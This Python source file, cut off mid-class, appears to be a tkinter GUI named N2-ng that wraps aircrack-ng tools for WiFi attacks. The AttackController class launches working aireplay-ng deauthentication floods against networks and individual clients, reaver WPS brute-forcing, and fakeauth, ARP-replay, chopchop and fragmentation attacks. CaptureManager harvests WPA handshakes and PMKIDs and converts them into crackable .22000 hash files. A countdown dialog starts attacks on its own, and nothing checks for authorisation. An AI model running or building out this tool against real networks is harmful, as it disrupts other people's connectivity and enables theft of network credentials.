#!/usr/bin/env python3
import atexit
import copy
import csv
import io
import json
import os
import queue
import re
import shutil
import shlex
import signal
import subprocess
import sys
import threading
import time
from collections import deque
from pathlib import Path
import tkinter as tk
import tkinter.font as tk_font
from tkinter import messagebox, simpledialog, ttk


THEME = {
    "bg": "#000000",
    "fg": "#00ff41",
    "panel": "#1a1a1a",
    "accent": "#00ff41",
    "warn": "#ffcc00",
    "error": "#ff4444",
    "info": "#00ccff",
}


class AnsiParser:
    """Minimal ANSI SGR parser for airodump-ng --color output."""

    ANSI_RE = re.compile(r"\x1b\[(\d+(?:;\d+)*)m")

    # Map basic ANSI foreground codes to theme colors.
    FG_COLORS = {
        30: "#000000",
        31: "#ff4444",
        32: "#00ff41",
        33: "#ffcc00",
        34: "#00ccff",
        35: "#ff00ff",
        36: "#00ccff",
        37: "#ffffff",
    }
    BG_COLORS = {
        40: "#000000",
        41: "#ff4444",
        42: "#00ff41",
        43: "#ffcc00",
        44: "#00ccff",
        45: "#ff00ff",
        46: "#00ccff",
        47: "#ffffff",
    }

    def parse(self, line: str) -> tuple[str, list[tuple[str, int, int]]]:
        """Return stripped text and list of (tag_name, start, end) tuples."""
        plain = []
        tags = []
        pos = 0
        bold = False
        fg = None
        bg = None
        last_tag = None
        tag_start = 0

        for match in self.ANSI_RE.finditer(line):
            segment = line[pos:match.start()]
            plain.append(segment)
            pos = match.end()

            codes = [int(c) for c in match.group(1).split(";") if c.isdigit()]
            if not codes:
                codes = [0]
            for code in codes:
                if code == 0:
                    bold = False
                    fg = None
                    bg = None
                elif code == 1:
                    bold = True
                elif 30 <= code <= 37:
                    fg = code
                elif 40 <= code <= 47:
                    bg = code

            current_tag = self._tag_name(fg, bg, bold)
            if current_tag != last_tag:
                if last_tag is not None:
                    tags.append((last_tag, tag_start, len("".join(plain))))
                last_tag = current_tag
                tag_start = len("".join(plain))

        plain.append(line[pos:])
        if last_tag is not None:
            tags.append((last_tag, tag_start, len("".join(plain))))

        return "".join(plain), tags

    def _tag_name(self, fg, bg, bold):
        parts = []
        if fg is not None:
            parts.append(f"fg_{fg}")
        if bg is not None:
            parts.append(f"bg_{bg}")
        if bold:
            parts.append("bold")
        return "ansi_" + "_".join(parts) if parts else "ansi_default"

    def configure_tags(self, text_widget: tk.Text):
        """Create tk.Text tags for all supported ANSI combinations."""
        for fg_code, color in self.FG_COLORS.items():
            text_widget.tag_configure(f"ansi_fg_{fg_code}", foreground=color)
        for bg_code, color in self.BG_COLORS.items():
            text_widget.tag_configure(f"ansi_bg_{bg_code}", background=color)
        text_widget.tag_configure("ansi_bold", font=("Courier", 10, "bold"))


def format_bssid(bssid: str) -> str:
    return bssid.upper().strip()


def _airodump_supports(flag: str) -> bool:
    """Return True if the installed airodump-ng supports ``flag``.

    The help text format varies across aircrack-ng versions; we look for the
    flag literally in the help output so unsupported flags don't crash the scan.
    """
    try:
        out = subprocess.check_output(["airodump-ng", "--help"], text=True, stderr=subprocess.STDOUT)
        return flag in out
    except Exception:
        return False


def airodump_color_args(settings) -> list[str]:
    """Return explicit airodump-ng color arguments for the selected setting."""
    if settings.get("color_output"):
        return ["--color"]
    return ["--color", "0"]


def sanitize_essid(essid: str, bssid: str) -> str:
    essid = essid.strip()
    bssid = format_bssid(bssid).replace(":", "-")
    if not essid or essid.lower().startswith("<length:") or essid == "":
        base = f"hidden_{bssid}"
    else:
        safe = re.sub(r'[\\/:*?"<>|]', "", essid)
        safe = safe.replace(" ", "_")
        safe = safe[:50]
        base = f"{safe}_{bssid}"
    return base


def human_size(size: int) -> str:
    if size < 1024:
        return f"{size} B"
    for unit in ("KB", "MB", "GB"):
        size /= 1024.0
        if size < 1024:
            return f"{size:.1f} {unit}"
    return f"{size:.1f} GB"


def user_home() -> Path:
    """Return the original user's home directory even when running under sudo."""
    sudo_user = os.environ.get("SUDO_USER")
    if sudo_user:
        try:
            import pwd
            return Path(pwd.getpwnam(sudo_user).pw_dir)
        except Exception:
            pass
    return Path.home()


def capture_root(create: bool = True) -> Path:
    root = user_home() / "hs" / "n2-ng"
    if create:
        root.mkdir(parents=True, exist_ok=True)
    return root


def scan_prefix(create: bool = True) -> str:
    scan_dir = capture_root(create=create) / "scan"
    if create:
        scan_dir.mkdir(parents=True, exist_ok=True)
    return str(scan_dir / "n2ng_scan")


def target_capture_prefix(essid: str, bssid: str, now: str | None = None) -> str:
    base = capture_root() / sanitize_essid(essid, bssid)
    base.mkdir(parents=True, exist_ok=True)
    timestamp = now or time.strftime("%Y-%m-%d_%H-%M-%S")
    candidate = base / f"capture_{timestamp}"
    if not Path(f"{candidate}-01.cap").exists():
        return str(candidate)
    suffix = 2
    while Path(f"{candidate}_{suffix}-01.cap").exists():
        suffix += 1
    return str(base / f"capture_{timestamp}_{suffix}")


def latest_airodump_csv_path(prefix: str) -> Path | None:
    matches = numbered_airodump_csv_paths(prefix)
    if not matches:
        return None
    return max(matches, key=lambda path: (path.stat().st_mtime, path.name))


def numbered_airodump_csv_paths(prefix: str) -> list[Path]:
    prefix_path = Path(prefix)
    parent = prefix_path.parent
    stem = re.escape(prefix_path.name)
    numbered_csv = re.compile(rf"^{stem}-\d+\.csv$")
    return [path for path in parent.glob(f"{prefix_path.name}-*.csv") if numbered_csv.match(path.name)]


class DependencyChecker:
    REQUIRED_TOOLS = {
        "airmon-ng": {"cmd": "airmon-ng", "apt": "sudo apt install -y aircrack-ng"},
        "airodump-ng": {"cmd": "airodump-ng", "apt": "sudo apt install -y aircrack-ng"},
        "aireplay-ng": {"cmd": "aireplay-ng", "apt": "sudo apt install -y aircrack-ng"},
        "iw": {"cmd": "iw", "apt": "sudo apt install -y iw"},
        "ip": {"cmd": "ip", "apt": "sudo apt install -y iproute2"},
    }
    OPTIONAL_TOOLS = {
        "hcxpcapngtool": {"cmd": "hcxpcapngtool", "apt": "sudo apt install -y hcxtools"},
        "wash": {"cmd": "wash", "apt": "sudo apt install -y reaver"},
        "reaver": {"cmd": "reaver", "apt": "sudo apt install -y reaver"},
        "mergecap": {"cmd": "mergecap", "apt": "sudo apt install -y wireshark-common"},
        "pcapfix": {"cmd": "pcapfix", "apt": "sudo apt install -y pcapfix"},
    }
    TOOLS = {**REQUIRED_TOOLS, **OPTIONAL_TOOLS}

    @classmethod
    def is_installed(cls, cmd: str) -> bool:
        result = subprocess.run(
            ["sh", "-c", f"command -v {shlex.quote(cmd)}"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        return result.returncode == 0

    @classmethod
    def check_all(cls) -> dict[str, dict]:
        statuses = {}
        for name, info in cls.REQUIRED_TOOLS.items():
            statuses[name] = {
                **info,
                "required": True,
                "installed": cls.is_installed(info["cmd"]),
            }
        for name, info in cls.OPTIONAL_TOOLS.items():
            statuses[name] = {
                **info,
                "required": False,
                "installed": cls.is_installed(info["cmd"]),
            }
        return statuses


class DependencySplash(tk.Toplevel):
    """Startup dependency report shown before the main window."""

    def __init__(self, root: tk.Tk):
        super().__init__(root)
        self.root = root
        self.result = True
        self.title("N2-ng loading")
        self.configure(bg=THEME["bg"])
        self.geometry("560x430")
        self.resizable(False, False)
        self.protocol("WM_DELETE_WINDOW", lambda: None)

        tk.Label(
            self,
            text="Checking N2-ng dependencies...",
            bg=THEME["bg"],
            fg=THEME["fg"],
            font=("TkDefaultFont", 12, "bold"),
        ).pack(anchor=tk.W, padx=12, pady=(12, 6))
        self.text = tk.Text(self, bg=THEME["bg"], fg=THEME["fg"], height=20, width=72, state=tk.DISABLED)
        self.text.pack(fill=tk.BOTH, expand=True, padx=12, pady=6)
        self.hint = tk.Label(self, text="", bg=THEME["bg"], fg=THEME["warn"])
        self.hint.pack(anchor=tk.W, padx=12, pady=(0, 12))
        self.bind_all("<Button-1>", self._maybe_close, add="+")
        self._checks_done = False

    def run(self) -> bool:
        self.grab_set()
        self.after(50, self._run_checks)
        self.wait_window()
        return self.result

    def _append(self, line: str):
        self.text.config(state=tk.NORMAL)
        self.text.insert(tk.END, line + "\n")
        self.text.see(tk.END)
        self.text.config(state=tk.DISABLED)
        self.update_idletasks()

    def _run_checks(self):
        statuses = DependencyChecker.check_all()
        missing_required = []
        for name, status in statuses.items():
            label = "required" if status["required"] else "optional"
            if status["installed"]:
                self._append(f"[OK]      {name} ({label})")
            else:
                self._append(f"[MISSING] {name} ({label}) - install: {status['apt']}")
                if status["required"]:
                    missing_required.append(name)
        self._checks_done = True
        if missing_required:
            self.result = False
            self.hint.config(text="Required tools are missing. Click to close after reading.")
            messagebox.showwarning(
                "N2-ng dependencies",
                "Missing required tools:\n"
                + "\n".join(missing_required)
                + "\n\nInstall commands are shown in the loading screen.",
                parent=self,
            )
        else:
            self.hint.config(text="Checks complete. Click anywhere in this loading screen to continue.")

    def _maybe_close(self, _event=None):
        if self._checks_done:
            self.unbind_all("<Button-1>")
            self.grab_release()
            self.destroy()


class AirmonManager:
    """Detect wireless adapters and manage monitor mode dynamically."""

    def __init__(self):
        # Maps original interface -> detected monitor interface
        self._mon_map: dict[str, str] = {}

    @staticmethod
    def _list_interfaces() -> set[str]:
        ifaces = set()
        try:
            out = subprocess.check_output(["ip", "link"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"^(?:\d+:\s+)?(\S+):", line)
                if m and m.group(1) != "lo":
                    ifaces.add(m.group(1))
        except Exception:
            pass
        return ifaces

    @staticmethod
    def _iface_mode(iface: str) -> str | None:
        try:
            out = subprocess.check_output(["iw", "dev", iface, "info"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"type\s+(\w+)", line)
                if m:
                    return m.group(1).lower()
        except Exception:
            pass
        return None

    @staticmethod
    def _is_monitor(iface: str) -> bool:
        return AirmonManager._iface_mode(iface) == "monitor"

    def list_physical_interfaces(self) -> list[str]:
        result = []
        try:
            out = subprocess.check_output(["airmon-ng"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines()[2:]:
                parts = line.split()
                # airmon-ng layout: phyN <iface> <driver> <chipset>
                if len(parts) >= 2 and parts[1].startswith(("wlan", "wlp")) and not parts[1].endswith("mon"):
                    result.append(parts[1])
        except Exception:
            pass
        try:
            out = subprocess.check_output(["ip", "link"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                m = re.search(r"^(?:\d+:\s+)?([ew]lan\d+|wlp\S+?):", line)
                if m:
                    name = m.group(1)
                    if name not in result and not name.endswith("mon"):
                        result.append(name)
        except Exception:
            pass
        return sorted(result)

    def _manual_monitor(self, iface: str) -> bool:
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
            subprocess.run(["iw", "dev", iface, "set", "type", "monitor"], check=True, capture_output=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
            return self._is_monitor(iface)
        except Exception:
            return False

    def start_monitor(self, iface: str) -> str:
        # Stop any previous monitor for this iface
        self.stop_monitor_for_iface(iface)
        before = self._list_interfaces()
        try:
            subprocess.run(["airmon-ng", "start", iface], check=True, capture_output=True, text=True)
        except subprocess.CalledProcessError:
            # airmon-ng failed; try manual iw sequence
            if self._manual_monitor(iface):
                self._mon_map[iface] = iface
                return iface
            raise RuntimeError(f"airmon-ng and manual iw both failed for {iface}")

        after = self._list_interfaces()
        new_ifaces = after - before
        # Prefer new interfaces that are monitor mode
        for cand in new_ifaces:
            if self._is_monitor(cand):
                self._mon_map[iface] = cand
                return cand
        # If no new interface, original may have been converted
        if self._is_monitor(iface):
            self._mon_map[iface] = iface
            return iface
        # Fallback: any existing monitor interface
        for cand in after:
            if self._is_monitor(cand):
                self._mon_map[iface] = cand
                return cand
        raise RuntimeError(f"Could not determine monitor interface for {iface}")

    def stop_monitor_for_iface(self, iface: str) -> None:
        mon = self._mon_map.pop(iface, None)
        if mon and mon != iface:
            subprocess.run(["airmon-ng", "stop", mon], capture_output=True, text=True)
        elif mon == iface:
            # Original iface was converted; set back to managed
            try:
                subprocess.run(["ip", "link", "set", iface, "down"], check=True, capture_output=True)
                subprocess.run(["iw", "dev", iface, "set", "type", "managed"], check=True, capture_output=True)
                subprocess.run(["ip", "link", "set", iface, "up"], check=True, capture_output=True)
            except Exception:
                pass
        # Also try airmon-ng stop on original name as safety net
        subprocess.run(["airmon-ng", "stop", iface], capture_output=True, text=True)

    def stop_monitor(self, mon_iface: str) -> None:
        if mon_iface:
            subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True, text=True)

    def cleanup(self) -> None:
        for iface in list(self._mon_map.keys()):
            self.stop_monitor_for_iface(iface)

    @staticmethod
    def _iface_exists(name: str) -> bool:
        return Path(f"/sys/class/net/{name}").exists()


def _normalize_csv_reader(reader: csv.DictReader):
    """Return fieldnames with surrounding whitespace stripped."""
    if reader.fieldnames:
        reader.fieldnames = [fn.strip() for fn in reader.fieldnames]
    return reader


def parse_airodump_csv(text: str):
    networks = []
    clients = []
    text = text.strip()
    if not text:
        return networks, clients
    sections = text.split("\n\n")
    if not sections:
        return networks, clients
    # Strip leading/trailing whitespace from each line to handle indented samples
    ap_lines = "\n".join(line.strip() for line in sections[0].splitlines())
    reader = _normalize_csv_reader(csv.DictReader(io.StringIO(ap_lines)))
    for row in reader:
        bssid = format_bssid(row.get("BSSID", ""))
        essid = row.get("ESSID", "").strip()
        if not essid or essid.lower().startswith("<length:"):
            essid = "[Hidden]"
        networks.append({
            "bssid": bssid,
            "first": row.get("First time seen", "").strip(),
            "last": row.get("Last time seen", "").strip(),
            "channel": row.get("channel", "").strip(),
            "speed": row.get("Speed", "").strip(),
            "privacy": row.get("Privacy", "").strip(),
            "cipher": row.get("Cipher", "").strip(),
            "auth": row.get("Authentication", "").strip(),
            "power": row.get("Power", "").strip(),
            "beacons": row.get("# Beacons", "").strip(),
            "iv": row.get("# IV", "").strip(),
            "id_len": row.get("ID-length", "").strip(),
            "manufacturer": row.get("Manufacturer", "").strip(),
            "essid": essid,
        })
    if len(sections) > 1:
        client_lines = "\n".join(line.strip() for line in sections[1].splitlines())
        reader = _normalize_csv_reader(csv.DictReader(io.StringIO(client_lines)))
        for row in reader:
            clients.append({
                "station": format_bssid(row.get("Station MAC", "")),
                "first": row.get("First time seen", "").strip(),
                "last": row.get("Last time seen", "").strip(),
                "power": row.get("Power", "").strip(),
                "packets": row.get("# packets", "").strip(),
                "bssid": format_bssid(row.get("BSSID", "")),
                "probed": row.get("Probed ESSIDs", "").strip(),
            })
    return networks, clients


class Settings:
    """Persistent airodump-ng settings stored in ~/.config/n2-ng/settings.json."""

    DEFAULTS = {
        "color_output": False,
        "sort_by": "PWR",
        "realtime_sort": False,
        "write_interval": 1,
        "output_formats": ["csv", "pcap"],
        "show_manufacturers": False,
        "filter_encryption": "All",
        "quiet_mode": False,
    }

    def __init__(self):
        self.path = user_home() / ".config" / "n2-ng" / "settings.json"
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self._assign_config_to_sudo_user()
        self.data = dict(self.DEFAULTS)
        self.load()

    def _assign_config_to_sudo_user(self):
        """Avoid leaving the original user's config directory root-owned."""
        sudo_user = os.environ.get("SUDO_USER")
        if os.geteuid() != 0 or not sudo_user:
            return
        try:
            import pwd
            account = pwd.getpwnam(sudo_user)
            os.chown(self.path.parent, account.pw_uid, account.pw_gid)
            if self.path.exists():
                os.chown(self.path, account.pw_uid, account.pw_gid)
        except OSError:
            pass

    def load(self):
        if self.path.exists():
            try:
                self.data.update(json.loads(self.path.read_text()))
            except Exception:
                pass
        self._normalize()

    def _normalize(self):
        formats = []
        for fmt in self.data.get("output_formats", []):
            normalized = "pcap" if fmt == "cap" else fmt
            if normalized not in formats:
                formats.append(normalized)
        if "csv" not in formats:
            formats.insert(0, "csv")
        self.data["output_formats"] = formats

    def save(self):
        try:
            self.path.write_text(json.dumps(self.data, indent=2))
            return True, None
        except Exception as e:
            return False, str(e)

    def get(self, key):
        return self.data.get(key, self.DEFAULTS.get(key))

    def set(self, key, value):
        self.data[key] = value


class AirodumpWorker(threading.Thread):
    """Run airodump-ng and parse its CSV output."""

    def __init__(self, event_queue: queue.Queue, settings: Settings):
        super().__init__(daemon=True)
        self.queue = event_queue
        self.settings = settings
        self._proc = None
        self._prefix = scan_prefix(create=False)
        self._running = threading.Event()
        self._shutdown = threading.Event()
        self._thread_started = False
        self._paused = threading.Event()
        self._last_cmd = None
        self._last_mon_iface = None
        self._last_band = None
        self._last_channel = None
        self._last_bssid = None
        self._data_lock = threading.Lock()
        self._latest_networks: list[dict] = []
        self._latest_clients: list[dict] = []
        self._raw_lock = threading.Lock()
        self._raw_lines: list[str] = []
        self._stdout_thread = None

    def _build_base_cmd(self, prefix: str) -> list[str]:
        fmt = ",".join(self.settings.get("output_formats"))
        cmd = [
            "airodump-ng",
            "--write-interval", str(self.settings.get("write_interval")),
            "-w", prefix,
            "--output-format", fmt,
        ]
        # Only pass flags the installed airodump-ng understands.
        if _airodump_supports("--color"):
            cmd.extend(airodump_color_args(self.settings))
        if self.settings.get("quiet_mode") and _airodump_supports("-q"):
            cmd.append("-q")
        if self.settings.get("show_manufacturers"):
            if _airodump_supports("--manufacturer"):
                cmd.append("--manufacturer")
            elif _airodump_supports("-M"):
                cmd.append("-M")
        return cmd

    def _ensure_poll_thread(self):
        if not self._thread_started:
            self._thread_started = True
            self.start()

    def _stop_process(self):
        if not self._proc:
            return
        try:
            if self._paused.is_set():
                self._proc.send_signal(signal.SIGCONT)
            self._proc.terminate()
            self._proc.wait(timeout=2)
        except Exception:
            try:
                self._proc.kill()
            except Exception:
                pass
        self._proc = None
        self._paused.clear()

    def _launch(self, cmd: list[str]) -> tuple[bool, str | None]:
        self._stop_process()
        self._last_cmd = cmd
        for csv_path in numbered_airodump_csv_paths(self._prefix):
            try:
                csv_path.unlink()
            except OSError:
                pass
        try:
            self._proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
        except OSError as e:
            self._proc = None
            self._running.clear()
            return False, str(e)
        with self._raw_lock:
            self._raw_lines = []
        self._stdout_thread = threading.Thread(target=self._read_stdout, args=(self._proc,), daemon=True)
        self._stdout_thread.start()
        self._running.set()
        self._paused.clear()
        self._ensure_poll_thread()
        return True, None

    def _read_stdout(self, proc):
        if not proc.stdout:
            return
        try:
            for line in proc.stdout:
                with self._raw_lock:
                    self._raw_lines.append(line.rstrip("\n"))
        except Exception as e:
            self.queue.put(("error", str(e)))

    def start_scan(self, mon_iface: str, band: str, prefix: str) -> tuple[bool, str | None]:
        self._prefix = prefix
        self._last_mon_iface = mon_iface
        self._last_band = band
        self._last_channel = None
        self._last_bssid = None
        band_arg = {"2.4GHz": "bg", "5GHz": "a", "Both": "abg"}.get(band, "abg")
        cmd = self._build_base_cmd(prefix)
        cmd.extend(["--band", band_arg, mon_iface])
        return self._launch(cmd)

    def start_lock(self, mon_iface: str, channel: int, bssid: str, prefix: str) -> tuple[bool, str | None]:
        self._prefix = prefix
        self._last_mon_iface = mon_iface
        self._last_band = None
        self._last_channel = channel
        self._last_bssid = bssid
        cmd = self._build_base_cmd(prefix)
        cmd.extend(["-c", str(channel), "--bssid", bssid, mon_iface])
        return self._launch(cmd)

    def restart_with_settings(self) -> tuple[bool, str | None]:
        """Restart the current scan/lock with updated settings."""
        if self._last_mon_iface and self._last_band:
            return self.start_scan(self._last_mon_iface, self._last_band, self._prefix)
        elif self._last_mon_iface and self._last_channel and self._last_bssid:
            return self.start_lock(self._last_mon_iface, self._last_channel, self._last_bssid, self._prefix)
        return True, None

    def is_running(self) -> bool:
        return bool(self._proc and self._proc.poll() is None)

    def pause(self):
        if self._proc and not self._paused.is_set():
            self._proc.send_signal(signal.SIGSTOP)
            self._paused.set()

    def resume(self):
        if self._proc and self._paused.is_set():
            self._proc.send_signal(signal.SIGCONT)
            self._paused.clear()

    def is_paused(self) -> bool:
        return self._paused.is_set()

    def stop(self):
        self._running.clear()
        self._stop_process()

    def clear_latest(self):
        with self._data_lock:
            self._latest_networks = []
            self._latest_clients = []

    def shutdown(self):
        self.stop()
        self._shutdown.set()

    def run(self):
        """Loop A: parse airodump-ng CSV into a shared buffer as fast as possible.

        The capture/channel hopping itself is handled by the airodump-ng
        subprocess; this thread polls the CSV output and updates the shared
        buffer every 200 ms.  Display rendering happens independently in Loop B.
        """
        last_mtime = 0
        last_csv_path = None
        poll_interval = 0.2  # 200 ms
        while not self._shutdown.is_set():
            csv_path = latest_airodump_csv_path(self._prefix)
            if self._running.is_set() and not self._paused.is_set() and csv_path and csv_path.exists():
                try:
                    mtime = csv_path.stat().st_mtime
                    if csv_path != last_csv_path or mtime != last_mtime:
                        last_csv_path = csv_path
                        last_mtime = mtime
                        text = csv_path.read_text(encoding="utf-8", errors="ignore")
                        networks, clients = parse_airodump_csv(text)
                        with self._data_lock:
                            self._latest_networks = networks
                            self._latest_clients = clients
                except Exception as e:
                    self.queue.put(("error", str(e)))
            time.sleep(poll_interval)

    def get_latest(self) -> tuple[list[dict], list[dict]]:
        """Return a deep copy of the most recently parsed networks and clients."""
        with self._data_lock:
            return copy.deepcopy(self._latest_networks), copy.deepcopy(self._latest_clients)

    def get_raw_lines(self) -> list[str]:
        with self._raw_lock:
            lines = self._raw_lines
            self._raw_lines = []
        return lines


class SignalGraph:
    """Simple tkinter Canvas line graph for received signal strength."""

    def __init__(self, parent):
        self.canvas = tk.Canvas(parent, bg=THEME["panel"], height=120, highlightthickness=0)
        self.canvas.pack(fill=tk.X, padx=5, pady=5)
        self.samples = deque(maxlen=60)

    def add_sample(self, pwr):
        try:
            val = int(pwr)
        except (TypeError, ValueError):
            val = -100
        self.samples.append(val)
        self._draw()

    def _draw(self):
        self.canvas.delete("all")
        w = self.canvas.winfo_width()
        h = self.canvas.winfo_height()
        if w < 10:
            self.canvas.after(100, self._draw)
            return
        for y in range(0, h, 20):
            self.canvas.create_line(0, y, w, y, fill="#333333")
        if len(self.samples) < 2:
            return
        step = w / (len(self.samples) - 1)
        points = []
        for i, val in enumerate(self.samples):
            y = h - ((max(-90, min(-30, val)) + 90) / 60) * h
            points.append((i * step, y))
        flat = [c for p in points for c in p]
        self.canvas.create_line(flat, fill=THEME["accent"], width=2)


class CountdownDialog(tk.Toplevel):
    """Modal dialog showing the exact attack command with a 3-second countdown."""

    def __init__(self, parent, command: list[str]):
        super().__init__(parent)
        self.title("Confirm Attack")
        self.configure(bg=THEME["bg"])
        self.resizable(False, False)
        tk.Label(self, text="Command to execute:", bg=THEME["bg"], fg=THEME["fg"]).pack(padx=10, pady=5)
        cmd_text = tk.Entry(self, width=80)
        cmd_text.insert(0, " ".join(command))
        cmd_text.config(state="readonly", bg=THEME["panel"], fg=THEME["fg"])
        cmd_text.pack(padx=10, pady=5)
        self.label = tk.Label(self, text="Executing in 3...", bg=THEME["bg"], fg=THEME["fg"], font=("TkDefaultFont", 12, "bold"))
        self.label.pack(padx=10, pady=10)
        btn_frame = tk.Frame(self, bg=THEME["bg"])
        btn_frame.pack(pady=5)
        tk.Button(btn_frame, text="Cancel", command=self._cancel, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Execute Now", command=self._execute, bg=THEME["panel"], fg=THEME["fg"]).pack(side=tk.LEFT, padx=5)
        self.result = False
        self.count = 3
        self._tick()
        self.transient(parent)
        self.grab_set()

    def _tick(self):
        if self.result or not self.winfo_exists():
            return
        if self.count <= 0:
            self._execute()
            return
        self.label.config(text=f"Executing in {self.count}...")
        self.count -= 1
        self.after(1000, self._tick)

    def _execute(self):
        self.result = True
        self.destroy()

    def _cancel(self):
        self.result = False
        self.destroy()


class AttackController:
    """Build and run aireplay-ng commands, streaming output to a log callback."""

    def __init__(self, log_func):
        self.log = log_func
        self._current = None
        self._lock = threading.Lock()

    def _run(self, cmd: list[str]):
        self.log(f"$ {' '.join(cmd)}")
        proc = None
        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
            )
            with self._lock:
                self._current = proc
            if proc.stdout:
                for line in proc.stdout:
                    self.log(line.rstrip())
            proc.wait()
        except OSError as e:
            self.log(f"Attack failed: {e}")
        finally:
            with self._lock:
                if self._current is proc:
                    self._current = None

    def _spawn(self, cmd: list[str]):
        threading.Thread(target=self._run, args=(cmd,), daemon=True).start()

    def stop_current(self) -> bool:
        with self._lock:
            proc = self._current
        if not proc or proc.poll() is not None:
            return False
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
        return True

    def deauth_all(self, bssid: str, mon_iface: str, count: int = 10):
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, mon_iface]
        self._spawn(cmd)

    def deauth_client(self, bssid: str, client: str, mon_iface: str, count: int = 10):
        cmd = ["aireplay-ng", "-0", str(count), "-a", bssid, "-c", client, mon_iface]
        self._spawn(cmd)

    def reaver(self, bssid: str, channel: str, mon_iface: str):
        cmd = ["reaver", "-i", mon_iface, "-b", bssid, "-c", str(channel), "-vv"]
        self._spawn(cmd)

    def legacy_attack(self, kind: str, bssid: str, our_mac: str, mon_iface: str):
        flag = {"fakeauth": "-1", "arpreplay": "-3", "chopchop": "-4", "fragmentation": "-5"}[kind]
        if kind == "fakeauth":
            cmd = ["aireplay-ng", flag, "0", "-a", bssid, "-h", our_mac, mon_iface]
        else:
            cmd = ["aireplay-ng", flag, "-b", bssid, "-h", our_mac, mon_iface]
        self._spawn(cmd)


class CaptureManager:
    """Manage capture files, poll .cap for handshake/PMKID, and convert to .22000."""

    def __init__(self, event_queue: queue.Queue, log_func):
        self.queue = event_queue
        self.log = log_func
        self.active_cap: Path | None = None
        self.handshake_found = False
        self.pmkid_found = False
        self._last_size = 0

    def set_active_cap(self, cap_path: Path):
        self.active_cap = cap_path
        self.handshake_found = False
        self.pmkid_found = False
        self._last_size = 0

    def get_size(self) -> int:
        if self.active_cap and self.active_cap.exists():
            return self.active_cap.stat().st_size
        return 0

    def poll(self):
        if not self.active_cap or not self.active_cap.exists():
            return
        size = self.get_size()
        if size == self._last_size:
            return
        self._last_size = size
        out22000 = self.active_cap.with_suffix(".22000")
        tmp = self.active_cap.with_suffix(".tmp22000")
        rc = None
        if shutil.which("hcxpcapngtool"):
            rc = subprocess.run(
                ["hcxpcapngtool", "-o", str(tmp), str(self.active_cap)],
                capture_output=True, text=True
            )
        elif shutil.which("aircrack-ng"):
            base = str(tmp.with_suffix(""))
            rc = subprocess.run(
                ["aircrack-ng", str(self.active_cap), "-J", base],
                capture_output=True, text=True
            )
            tmp = Path(base + ".hccap")
        else:
            return
        if rc and rc.returncode == 0 and tmp.exists() and tmp.stat().st_size > 0:
            shutil.move(str(tmp), str(out22000))
            self._classify(out22000)
        elif tmp.exists():
            tmp.unlink(missing_ok=True)

    def _classify(self, path: Path):
        text = path.read_text(errors="ignore")
        if "WPA*02" in text and not self.handshake_found:
            self.handshake_found = True
            self.queue.put(("handshake", {"file": str(path), "type": "handshake"}))
        if "WPA*01" in text and not self.pmkid_found:
            self.pmkid_found = True
            self.queue.put(("pmkid", {"file": str(path), "type": "pmkid"}))

    def convert(self, cap: Path) -> Path | None:
        out = cap.with_suffix(".22000")
        if shutil.which("hcxpcapngtool"):
            rc = subprocess.run(["hcxpcapngtool", "-o", str(out), str(cap)], capture_output=True, text=True)
            if rc.returncode == 0 and out.exists() and out.stat().st_size > 0:
                return out
        return None

    def merge(self, caps: list[Path], output: Path) -> bool:
        if not shutil.which("mergecap"):
            return False
        cmd = ["mergecap", "-w", str(output)] + [str(c) for c in caps]
        rc = subprocess.run(cmd, capture_output=True, text=True)
        return rc.returncode == 0 and output.exists() and output.stat().st_size > 0

    def fix(self, cap: Path) -> Path | None:
        if not shutil.which("pcapfix"):
            return None
        out = cap.with_suffix(".fixed.cap")
        rc = subprocess.run(["pcapfix", "-o", str(out), str(cap)], capture_output=True, text=True)
        if rc.returncode == 0 and out.exists() and out.stat().st_size > 0:
            return out
        return None


class WpsScanner(threading.Thread):
    """Run wash or reaver --scan and report lines via callback."""

    def __init__(self, mon_iface: str, callback):
        super().__init__(daemon=True)
        self.mon_iface = mon_iface
        self.callback = callback
        self._stop = threading.Event()
        self._proc = None

    def run(self):
        cmd = None
        if shutil.which("wash"):
            cmd = ["wash", "-i", self.mon_iface]
        elif shutil.which("reaver"):
            cmd = ["reaver", "-i", self.mon_iface, "--scan"]
        else:
            self.callback("error", "wash/reaver not found")
            return
        self._proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        while not self._stop.is_set():
            line = self._proc.stdout.readline()
            if not line:
                break
            self.callback("wps_line", line.strip())
        self._proc.terminate()

    def stop(self):
        self._stop.set()
        if self._proc:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=2)
            except Exception:
                try:
                    self._proc.kill()
                except Exception:
                    pass


class AirodumpRawView:
    """Read-only tk.Text widget showing ANSI-colored airodump-ng output."""

    MAX_LINES = 500

    def __init__(self, parent):
        self.frame = tk.Frame(parent, bg=THEME["bg"])
        self.frame.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
        parent.grid_rowconfigure(0, weight=1)
        parent.grid_columnconfigure(0, weight=1)

        self.text = tk.Text(
            self.frame,
            bg=THEME["bg"],
            fg=THEME["fg"],
            font=("Consolas", 10),
            wrap=tk.NONE,
            state=tk.DISABLED,
            height=20,
        )
        self.y_scrollbar = ttk.Scrollbar(self.frame, orient=tk.VERTICAL, command=self.text.yview)
        self.x_scrollbar = ttk.Scrollbar(self.frame, orient=tk.HORIZONTAL, command=self.text.xview)
        self.text.configure(yscrollcommand=self.y_scrollbar.set, xscrollcommand=self.x_scrollbar.set)
